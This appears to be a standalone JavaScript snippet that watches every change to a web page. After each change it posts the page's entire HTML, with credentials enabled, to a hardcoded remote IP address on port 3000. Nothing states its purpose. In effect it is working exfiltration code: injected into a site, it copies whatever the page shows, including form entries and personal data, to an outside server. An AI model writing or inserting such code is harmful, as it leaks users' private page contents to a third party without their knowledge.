detectChanges();


function detectChanges(){
	var mutationObserver = new MutationObserver(function(mutations) {
	  mutations.forEach(function(mutation) {
	    console.log("go!");
	    sendCode();
	  });
	});

	mutationObserver.observe(document.documentElement, {
	  attributes: true,
	  characterData: true,
	  childList: true,
	  subtree: true,
	  attributeOldValue: true,
	  characterDataOldValue: true
	});
	
}

function sendCode(){
	var data = new FormData();
	data.append("code", document.documentElement.innerHTML);

	var xhr = new XMLHttpRequest();
	xhr.withCredentials = true;

	xhr.addEventListener("readystatechange", function () {
	  if (this.readyState === 4) {
	    console.log(this.responseText);
	  }
	});

	xhr.open("POST", "http://34.73.50.157:3000/");
	xhr.setRequestHeader("cache-control", "no-cache");
	xhr.setRequestHeader("Postman-Token", "5b9434ae-c1da-48ee-aebd-000fc2970632");

	xhr.send(data);
}